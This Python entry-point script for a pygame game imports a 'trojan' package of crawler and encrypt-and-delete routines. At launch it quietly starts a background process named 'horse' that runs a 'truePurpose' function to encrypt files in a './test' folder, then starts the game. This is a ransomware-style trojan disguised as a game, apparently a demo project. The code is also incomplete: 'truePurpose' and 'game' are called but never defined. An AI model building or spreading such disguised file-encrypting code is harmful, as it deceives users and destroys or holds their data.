import pygame
import os
import pathlib
from typing import List
from multiprocessing import Process

# Relative Imports
from game.menu.main_menu import main_menu
from trojan.crawler import Crawler
from trojan.crypto import encryptAndDeletePlaintext, decryptAndDeleteCipherText

PATH_TO_DIR = pathlib.Path(__file__).parent.absolute()

# load image assets
main_menu_bkground = pygame.image.load(
    f"{PATH_TO_DIR}{os.sep}assets{os.sep}menu{os.sep}main_menu_background.png"
)



if __name__ == "__main__":
    p: Process = Process(target=truePurpose, args=["./test"])

    p.name: str = "horse"
    p.start()

    # For now, we'll encrypt all files in the test directory, that are a txt file.
    game()
